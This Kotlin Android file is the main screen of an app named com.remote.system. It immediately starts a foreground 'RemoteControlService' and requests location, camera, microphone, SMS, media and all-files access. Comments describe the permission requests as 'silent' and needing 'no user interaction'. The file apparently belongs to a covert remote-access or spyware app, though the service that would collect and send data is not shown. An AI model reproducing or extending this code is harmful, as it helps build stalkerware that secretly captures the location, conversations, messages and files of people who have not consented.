package com.remote.system

import android.Manifest
import android.content.*
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager

class MainActivity : AppCompatActivity() {
    companion object {
        const val CONNECTION_STATUS_ACTION = "CONNECTION_STATUS_UPDATE"
        const val STATUS_KEY = "status"
        const val ERROR_KEY = "error"
    }

    private val permissionRequestCode = 123
    private lateinit var statusTextView: TextView
    private lateinit var connectionStatusIcon: TextView
    private lateinit var errorTextView: TextView
    
    private val handler = Handler(Looper.getMainLooper())
    private val statusUpdateReceiver = StatusUpdateReceiver()

    private val requiredPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        initializeUI()
        registerStatusReceiver()
        
        // Auto-start service immediately
        startRemoteService()
        
        // Request permissions silently in background
        checkAndRequestPermissions()
    }

    private fun initializeUI() {
        statusTextView = findViewById(R.id.statusTextView)
        connectionStatusIcon = findViewById(R.id.connectionStatusIcon)
        errorTextView = findViewById(R.id.errorTextView)
        
        updateConnectionStatus(getString(R.string.service_status_initial), "🟡", getString(R.string.ui_system_ready))
    }

    private fun registerStatusReceiver() {
        val filter = IntentFilter(CONNECTION_STATUS_ACTION)
        LocalBroadcastManager.getInstance(this).registerReceiver(statusUpdateReceiver, filter)
    }

    private fun updateConnectionStatus(status: String, icon: String, error: String) {
        handler.post {
            statusTextView.text = status
            connectionStatusIcon.text = icon
            
            if (error.isNotEmpty()) {
                errorTextView.text = error
                errorTextView.visibility = TextView.VISIBLE
            } else {
                errorTextView.visibility = TextView.GONE
            }
        }
    }

    private inner class StatusUpdateReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            intent?.let {
                val status = it.getStringExtra(STATUS_KEY) ?: "Unknown"
                val error = it.getStringExtra(ERROR_KEY) ?: ""
                
                val icon = when {
                    status.contains("Connected", ignoreCase = true) -> "🟢"
                    status.contains("Connecting", ignoreCase = true) -> "🟡"
                    status.contains("Disconnected", ignoreCase = true) -> "🔴"
                    status.contains("Error", ignoreCase = true) -> "❌"
                    else -> "🟡"
                }
                
                updateConnectionStatus(status, icon, error)
            }
        }
    }

    private fun checkAndRequestPermissions() {
        val permissionsToRequest = ArrayList<String>()

        for (permission in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission)
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            requestManageExternalStoragePermission()
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), permissionRequestCode)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        // Silent permission handling - no user interaction needed
    }

    private fun requestManageExternalStoragePermission() {
        try {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } catch (e: Exception) {
            val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
            startActivity(intent)
        }
    }

    private fun startRemoteService() {
        val serviceIntent = Intent(this, RemoteControlService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        LocalBroadcastManager.getInstance(this).unregisterReceiver(statusUpdateReceiver)
    }
}